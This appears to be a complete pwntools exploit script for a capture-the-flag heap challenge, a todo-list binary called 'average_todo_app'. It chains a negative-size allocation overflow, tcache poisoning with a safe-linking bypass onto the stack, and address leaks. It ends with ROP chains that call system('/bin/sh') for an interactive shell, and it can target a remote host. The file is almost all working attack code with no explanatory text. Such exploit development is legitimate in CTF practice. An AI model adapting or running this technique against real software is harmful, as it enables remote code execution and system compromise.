#!/usr/bin/python3

from pwn import *
import sys
from ctypes import CDLL

context.terminal = "kitty"
context.gdbinit = "/opt/pwndbg/gdbinit"
context.log_level = "info"        # 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING'
binary = "./average_todo_app"        ### CHANGE ME !!!!!!!!!!!!!!!!

gdbscript = '''
c
'''

libcx = CDLL("libc.so.6")
# now = int(floor(time.time()))
# libcx.srand(now)
# print(libcx.rand())

def init():
    ## loading custom libc
    # env = {"LD_PRELOAD": "./desired_libc"}
    ## loading custom libc
    if (args.GDB):
        pp = gdb.debug(binary, gdbscript=gdbscript)
    elif (args.REMOTE):
        pp = remote(sys.argv[1], int(sys.argv[2]))
    else :
        pp = process(binary)# env=env)
    return pp

def unpack_ptr(ptr):
    if (len(ptr) < 8):
        ptr += (8 - len(ptr)) * b"\x00"
    return (u64(ptr))

def findip(pp, length):
    cyclic_patt = cyclic(length)
    pp.recv()
    pp.sendline(cyclic_patt)
    pp.wait()
    # offset = cyclic_find(pp.core.pc)
    offset = cyclic_find(pp.corefile.read(pp.core.sp, 4))
    log.info(f"offset found {offset}")

alloc_num = 0

def allocate(content, clen):
    pp.recvuntil(b">> ")
    pp.sendline(b"2")
    pp.recvuntil(b">> ")
    pp.sendline(str(clen).encode())
    pp.recvuntil(b">> ")
    pp.send(content)
    id = int(pp.recvline().rstrip().replace(b"Battle added, todo index is ", b""))
    return id


def delete(idx):
    pp.recvuntil(b">> ")
    pp.sendline(b"3")
    pp.recvuntil(b">> ")
    pp.sendline(str(idx).encode())

def edit(idx, content):
    pp.recvuntil(b">> ")
    pp.sendline(b"6")
    pp.recvuntil(b">> ")
    pp.sendline(str(idx).encode())
    pp.recvuntil(b">> ")
    pp.send(content)

def printt(idx):
    pp.recvuntil(b">> ")
    pp.sendline(b"4")
    pp.recvuntil(b">> ")
    pp.sendline(str(idx).encode())
    return pp.recvline().rstrip().replace(b"[ ] - ", b"")

def exploit():
    log.info("filling tcache up")
    for i in range(7):
        allocate(b"a\n", 56)
    for i in range(7):
        delete(i)

    log.info("allocating two bins")
    a = allocate(b"a\n", 56)
    b = allocate(b"\x41", -1)       # using b as the tmp buffer to leak it
    log.info("freeing a")
    blocker = allocate(b"\x00", 16)       # merging the leak chunk
    delete(a)
    new_a = allocate(b"\x00" * 56 + b'\x41', 56)
    delete(b)
    edit(a, b"\x00" * 56 + b'\x43')
    liks = allocate(b"A" * 8, 56)      # getting the leak 11
    stack_leak = unpack_ptr(printt(11).replace(b"A" * 8, b""))
    edit(a, b"\x00" * 56 + b'\x41')
    log.info(f"stack leak {hex(stack_leak)}")
    log.info("filling up tcache again")
    hliks = allocate(b"A" * 8, 56)      # getting the leak 11
    delete(hliks)
    heap_base = unpack_ptr(printt(hliks)) << 12
    log.info(f"heap base {hex(heap_base)}")
    fake_fastbin_alloc = allocate(b"fastbin", 56)
    fake_fastbin_addr = heap_base + 0x630
    log.info(f"fake_fastbin_addr {hex(fake_fastbin_addr)}")
    delete(fake_fastbin_alloc)
    edit(fake_fastbin_alloc,  p64( ((fake_fastbin_addr + 16) >> 12 ) ^ (stack_leak - 8))[0:7] )
    fastbin = allocate(b"fb", 56)
    pop_rdi = 0x00000000004018c5
    pay = flat(
            cyclic(24),
            pop_rdi,
            elf.got.puts,
            elf.plt.puts,
            elf.sym.main
            )
    stack_chunk = allocate(pay, 56)
    log.info("triggering the rop")
    pp.recvuntil(b">> ")
    pp.sendline(b"69")
    libc_base = unpack_ptr(pp.recvline().rstrip()) - libc.sym.puts
    log.info(f"libc_leak {hex(libc_base)}")
    log.info(f"filling tcache up")
    p = allocate(b"a\n", 64)
    for i in range(6):
        allocate(b"a\n", 64)
    for i in range(p, p+7):
        delete(i)

    a = allocate(b"heapdzeb\n", 64)
    b = allocate(b"\x51", -1)       # next chunk will be here
    delete(a)
    a_addr = heap_base + 2464
    edit(a, p64( ((a_addr + 16) >> 12 ) ^ (stack_leak + 8))[0:7] )
    waste = allocate(b"heapdzeb\n", 64)
    payload = flat(
            cyclic(24),
            pop_rdi,
            next(libc.search(b"/bin/sh\x00")) + libc_base,
            pop_rdi+1,
            libc.sym.system + libc_base,
            )
    stack_chunk = allocate(payload, 64)
    log.info("triggering shellcode")
    pp.recvuntil(b">>")
    pp.sendline(b"69")

    
    pp.interactive()
    

if (args.REMOTE):
    libc = ELF("./libc.so.6")
else:
    libc = ELF("/usr/lib/libc.so.6")
libcrops = ROP(libc)
elfrops = ROP(libc)
elf = context.binary = ELF(binary)
pp = init()
exploit()
